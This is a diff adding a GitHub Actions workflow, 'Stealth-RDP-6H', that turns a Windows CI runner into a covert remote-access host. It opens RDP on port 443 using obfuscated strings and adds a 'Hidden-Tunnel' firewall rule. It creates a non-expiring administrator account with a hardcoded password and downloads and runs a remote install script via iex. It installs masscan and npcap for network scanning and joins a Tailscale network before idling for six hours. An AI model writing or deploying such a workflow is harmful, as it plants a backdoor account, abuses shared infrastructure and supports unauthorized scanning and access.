@@ -1,0 +1,61 @@
+name: Stealth-RDP-6H
+
+on:
+  workflow_dispatch:
+
+jobs:
+  stealth:
+    runs-on: windows-2022
+    timeout-minutes: 360
+
+    steps:
+      - name: Obfuscate Access
+        shell: powershell
+        run: |
+          $base = 'HKLM:\System\CurrentControlSet\Control\Terminal Server'
+          $station = $base + '\WinStations\' + ('R' + 'D' + 'P' + '-Tcp')
+
+          Set-ItemProperty $base -Name fDenyTSConnections -Value 0 -Force
+          Set-ItemProperty $station -Name UserAuthentication -Value 1 -Force
+          Set-ItemProperty $station -Name SecurityLayer -Value 2 -Force
+          Set-ItemProperty $station -Name PortNumber -Value 443 -Force
+
+          netsh advfirewall firewall add rule name="Hidden-Tunnel" dir=in action=allow protocol=TCP localport=443 | Out-Null
+
+          if (-not (Get-LocalUser -Name SysCore -ErrorAction SilentlyContinue)) {
+            net user SysCore 'X9#mK2$pL' /add /expires:never | Out-Null
+          }
+          net localgroup Administrators SysCore /add | Out-Null
+          net localgroup "Remote Desktop Users" SysCore /add | Out-Null
+
+          Restart-Service TermService -Force
+
+      - name: Install Tools Silently
+        shell: powershell
+        run: |
+          Set-ExecutionPolicy Bypass -Scope Process -Force
+          [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072
+          iex ((New-Object System.Net.WebClient).DownloadString('https://community.chocolatey.org/install.ps1'))
+          choco install -y masscan npcap --limit-output --no-progress
+
+      - name: Connect Tailscale
+        shell: powershell
+        run: |
+          $ts = "$env:ProgramFiles\Tailscale\tailscale.exe"
+          if (-not (Test-Path $ts)) {
+            Invoke-WebRequest 'https://pkgs.tailscale.com/stable/tailscale-setup-1.82.0-amd64.msi' -OutFile "$env:TEMP\ts.msi"
+            Start-Process msiexec.exe -ArgumentList "/i","$env:TEMP\ts.msi","/quiet","/norestart" -Wait
+          }
+          & $ts up --authkey=${{ secrets.TAILSCALE_AUTHKEY }} --hostname=stealth-$env:GITHUB_RUN_ID
+          $ip = $null
+          for($i=0; $i -lt 10 -and -not $ip; $i++) {
+            $ip = & $ts ip -4 2>$null
+            if(-not $ip){ Start-Sleep 5 }
+          }
+          if(-not $ip){ exit 1 }
+          Write-Host "Ready"
+
+      - name: Hold
+        shell: powershell
+        run: |
+          while($true){ Start-Sleep 60 }
